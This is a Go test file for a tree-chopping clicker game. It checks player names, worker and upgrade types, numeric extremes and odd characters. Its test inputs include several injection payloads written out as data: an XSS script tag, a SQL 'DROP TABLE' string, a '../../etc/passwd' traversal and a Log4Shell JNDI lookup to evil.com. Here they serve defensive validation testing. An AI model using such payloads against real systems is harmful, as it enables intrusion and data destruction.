package game

import (
	"math"
	"strings"
	"testing"
	"time"
	"unicode"
)

func TestPlayerNameValidation(t *testing.T) {
	testCases := []struct {
		name        string
		playerName  string
		shouldWork  bool
		description string
	}{
		{"empty_name", "", true, "empty name should work"},
		{"normal_name", "Player1", true, "normal name should work"},
		{"unicode_name", "玩家१२३", true, "unicode name should work"},
		{"emoji_name", "Player🎮🌳", true, "emoji name should work"},
		{"very_long_name", strings.Repeat("a", 10000), true, "very long name should work"},
		{"special_chars", "Player!@#$%^&*()", true, "special characters should work"},
		{"whitespace_name", "   Player   ", true, "whitespace name should work"},
		{"newline_name", "Player\nWith\nNewlines", true, "newlines should work"},
		{"tab_name", "Player\tWith\tTabs", true, "tabs should work"},
		{"html_name", "<script>alert('xss')</script>", true, "html should work"},
		{"sql_injection", "'; DROP TABLE users; --", true, "sql injection attempt should work"},
		{"json_name", `{"malicious": "json"}`, true, "json should work"},
		{"xml_name", "<?xml version='1.0'?><root/>", true, "xml should work"},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			game := NewGame(tc.playerName)
			
			if tc.shouldWork {
				if game == nil {
					t.Errorf("Game creation failed for %s", tc.description)
				} else if game.State.PlayerName != tc.playerName {
					t.Errorf("Player name not preserved: expected %q, got %q", tc.playerName, game.State.PlayerName)
				}
			} else {
				if game != nil {
					t.Errorf("Game creation should have failed for %s", tc.description)
				}
			}
		})
	}
}

func TestInvalidWorkerTypes(t *testing.T) {
	game := NewGame("ValidationPlayer")
	game.State.Wood = 1000

	invalidWorkers := []string{
		"",
		"invalid",
		"PTIT_LU",
		"ptit lu",
		"ptit-lu",
		"ptit_lu_extra",
		"mathieu123",
		"vico_modified",
		"nonexistent",
		"null",
		"undefined",
		"<script>",
		"../../etc/passwd",
		"${jndi:ldap://evil.com/a}",
		strings.Repeat("a", 1000),
	}

	for _, worker := range invalidWorkers {
		t.Run("invalid_worker_"+worker, func(t *testing.T) {
			err := game.BuyWorker(worker)
			if err == nil {
				t.Errorf("Should have failed for invalid worker type: %q", worker)
			}
		})
	}
}

func TestInvalidUpgradeTypes(t *testing.T) {
	game := NewGame("ValidationPlayer")
	game.State.Wood = 10000

	invalidUpgrades := []string{
		"",
		"invalid",
		"AUTO_CLICKER",
		"auto clicker",
		"auto-clicker",
		"autoclicker",
		"lumberjack_school_extra",
		"brewery_bonus123",
		"golden_axe_modified",
		"nonexistent_upgrade",
		"<script>alert('xss')</script>",
		"../../etc/passwd",
		"${jndi:ldap://evil.com/a}",
		strings.Repeat("a", 1000),
	}

	for _, upgrade := range invalidUpgrades {
		t.Run("invalid_upgrade_"+upgrade, func(t *testing.T) {
			err := game.BuyUpgrade(upgrade)
			if err == nil {
				t.Errorf("Should have failed for invalid upgrade type: %q", upgrade)
			}
		})
	}
}

func TestNegativeValues(t *testing.T) {
	game := NewGame("NegativePlayer")
	
	game.State.Wood = -1000
	_, _, err := game.ChopTree()
	if err != nil {
		t.Errorf("ChopTree should work with negative wood")
	}
	
	game.State.Beer = -500
	err = game.BuyBeer()
	if err == nil {
		t.Errorf("Should not be able to buy beer with negative wood")
	}
	
	game.State.AxeLevel = -10
	err = game.UpgradeAxe()
	if err == nil {
		t.Errorf("Should not be able to upgrade axe with negative wood")
	}
}

func TestZeroValues(t *testing.T) {
	game := NewGame("ZeroPlayer")
	
	game.State.Wood = 0
	game.State.Beer = 0
	game.State.AxeLevel = 0
	game.State.TreeHP = 0
	
	_, _, err := game.ChopTree()
	if err == nil {
		t.Errorf("Should fail to chop tree with 0 HP")
	}
	
	err = game.BuyBeer()
	if err == nil {
		t.Errorf("Should not be able to buy beer with 0 wood")
	}
}

func TestMaximumValues(t *testing.T) {
	game := NewGame("MaxPlayer")
	
	game.State.Wood = math.MaxInt
	game.State.Beer = math.MaxInt
	game.State.AxeLevel = math.MaxInt
	game.State.PrestigePoints = math.MaxInt
	
	_, _, err := game.ChopTree()
	if err != nil {
		t.Errorf("ChopTree should work with maximum values: %v", err)
	}
	
	err = game.BuyBeer()
	if err != nil {
		t.Errorf("BuyBeer should work with maximum wood: %v", err)
	}
}

func TestTimeManipulation(t *testing.T) {
	game := NewGame("TimePlayer")
	
	futureTime := time.Now().Add(24 * time.Hour)
	game.State.StartTime = futureTime
	game.State.LastUpdate = futureTime
	
	duration := game.GetGameDuration()
	if duration > 0 {
		t.Errorf("Game duration should be negative for future start time, got %v", duration)
	}
	
	pastTime := time.Now().Add(-365 * 24 * time.Hour)
	game.State.LastUpdate = pastTime
	
	woodGained := game.ProcessWorkers()
	if woodGained < 0 {
		t.Errorf("Wood gained should not be negative: %d", woodGained)
	}
}

func TestRandomSeedConsistency(t *testing.T) {
	game1 := NewGame("SeedPlayer1")
	game2 := NewGame("SeedPlayer2")
	
	results1 := make([]int, 100)
	results2 := make([]int, 100)
	
	for i := 0; i < 100; i++ {
		woodGained1, _, _ := game1.ChopTree()
		woodGained2, _, _ := game2.ChopTree()
		results1[i] = woodGained1
		results2[i] = woodGained2
	}
	
	identical := true
	for i := 0; i < 100; i++ {
		if results1[i] != results2[i] {
			identical = false
			break
		}
	}
	
	if identical {
		t.Errorf("Random results should not be identical between different games")
	}
}

func TestCostCalculationEdgeCases(t *testing.T) {
	game := NewGame("CostPlayer")
	
	// Test with reasonable high values instead of max int to avoid overflow
	game.State.AxeLevel = 1000
	cost := game.getAxeUpgradeCost()
	if cost <= 0 {
		t.Errorf("Axe upgrade cost should be positive for level 1000: %d", cost)
	}
	
	game.State.Workers.PtitLu = 1000
	cost = game.getWorkerCost("ptit_lu", game.State.Workers.PtitLu)
	if cost <= 0 {
		t.Errorf("Worker cost should be positive for 1000 workers: %d", cost)
	}
	
	game.State.Beer = 1000
	cost = game.getBeerCost()
	if cost <= 0 {
		t.Errorf("Beer cost should be positive for 1000 beers: %d", cost)
	}
}

func TestFloatingPointPrecision(t *testing.T) {
	game := NewGame("PrecisionPlayer")
	game.State.Beer = 1
	
	for i := 0; i < 1000; i++ {
		game.State.TreeHP = 1
		woodGained, _, _ := game.ChopTree()
		
		if woodGained < 0 {
			t.Errorf("Wood gained should not be negative due to floating point precision")
		}
	}
}

func TestStateConsistency(t *testing.T) {
	game := NewGame("ConsistencyPlayer")
	
	for i := 0; i < 1000; i++ {
		initialWood := game.State.Wood
		initialStats := game.State.Stats.TotalWoodGained
		
		woodGained, _, _ := game.ChopTree()
		
		if woodGained > 0 {
			expectedWood := initialWood + woodGained
			expectedStats := initialStats + woodGained
			
			if game.State.Wood != expectedWood {
				t.Errorf("Wood state inconsistency: expected %d, got %d", expectedWood, game.State.Wood)
			}
			
			if game.State.Stats.TotalWoodGained != expectedStats {
				t.Errorf("Stats inconsistency: expected %d, got %d", expectedStats, game.State.Stats.TotalWoodGained)
			}
		}
	}
}

func TestDeepCopyBehavior(t *testing.T) {
	game := NewGame("DeepCopyPlayer")
	
	originalWood := game.State.Wood
	originalStats := game.State.Stats
	
	game.State.Wood = 1000
	game.State.Stats.TotalClicks = 999
	
	if originalWood == game.State.Wood {
		t.Errorf("Original wood value should not be affected by modification")
	}
	
	if originalStats.TotalClicks == game.State.Stats.TotalClicks {
		t.Errorf("Original stats should not be affected by modification")
	}
}

func TestUnicodePlayerNames(t *testing.T) {
	unicodeNames := []string{
		"玩家",
		"игрок",
		"プレイヤー",
		"مشغل",
		"🎮🌳🍺",
		"Ñiño",
		"Øystein",
		"Zürich",
		"москва",
		"東京",
	}

	for _, name := range unicodeNames {
		t.Run("unicode_"+name, func(t *testing.T) {
			game := NewGame(name)
			
			if game.State.PlayerName != name {
				t.Errorf("Unicode name not preserved: expected %q, got %q", name, game.State.PlayerName)
			}
			
			_, _, err := game.ChopTree()
			if err != nil {
				t.Errorf("Game with unicode name should function normally: %v", err)
			}
		})
	}
}

func TestControlCharacters(t *testing.T) {
	controlChars := []string{
		"\x00",
		"\x01",
		"\x02",
		"\x1F",
		"\x7F",
		"\u0080",
		"\u009F",
		"\uFFFE",
		"\uFFFF",
	}

	for _, char := range controlChars {
		t.Run("control_char", func(t *testing.T) {
			game := NewGame("Player" + char)
			
			_, _, err := game.ChopTree()
			if err != nil {
				t.Errorf("Game with control characters should work: %v", err)
			}
		})
	}
}

func TestMemoryLeaks(t *testing.T) {
	for i := 0; i < 10000; i++ {
		game := NewGame("MemoryPlayer" + string(rune(i%256)))
		
		for j := 0; j < 10; j++ {
			game.ChopTree()
			game.ProcessWorkers()
		}
		
		game = nil
	}
}

func TestNilPointerSafety(t *testing.T) {
	var game *Game
	
	defer func() {
		if r := recover(); r == nil {
			t.Errorf("Expected panic when calling methods on nil game")
		}
	}()
	
	game.ChopTree()
}

func TestInvalidJSONCharacters(t *testing.T) {
	invalidJSON := []string{
		string(rune(0x00)),
		string(rune(0x01)),
		string(rune(0x08)),
		string(rune(0x0C)),
		"\x7F",
		"\uFFFE",
		"\uFFFF",
	}

	for _, char := range invalidJSON {
		t.Run("invalid_json_char", func(t *testing.T) {
			game := NewGame("Player" + char)
			
			if game.State.PlayerName != "Player"+char {
				t.Errorf("Invalid JSON character should be preserved in game state")
			}
		})
	}
}

func TestNonPrintableCharacters(t *testing.T) {
	for r := rune(0); r <= unicode.MaxRune; r++ {
		if !unicode.IsPrint(r) && r%1000 == 0 {
			t.Run("non_printable", func(t *testing.T) {
				game := NewGame("Player" + string(r))
				
				_, _, err := game.ChopTree()
				if err != nil {
					t.Errorf("Game with non-printable character should work: %v", err)
				}
			})
		}
	}
}

func TestConcurrentStateModification(t *testing.T) {
	game := NewGame("ConcurrentModPlayer")
	game.State.Wood = 1000000
	
	done := make(chan bool)
	
	go func() {
		for i := 0; i < 1000; i++ {
			game.State.Wood = 999999
		}
		done <- true
	}()
	
	go func() {
		for i := 0; i < 1000; i++ {
			game.ChopTree()
		}
		done <- true
	}()
	
	<-done
	<-done
}

func TestBoundaryConditions(t *testing.T) {
	game := NewGame("BoundaryPlayer")
	
	game.State.TreeHP = 1
	game.State.AxeLevel = math.MaxInt32
	
	_, _, err := game.ChopTree()
	if err != nil {
		t.Errorf("Should handle boundary condition of max damage vs min HP: %v", err)
	}
	
	game.State.Beer = math.MaxInt32
	game.State.TreeHP = 1
	
	woodGained, _, _ := game.ChopTree()
	if woodGained < 0 {
		t.Errorf("Wood gained should not be negative even with extreme bonuses")
	}
}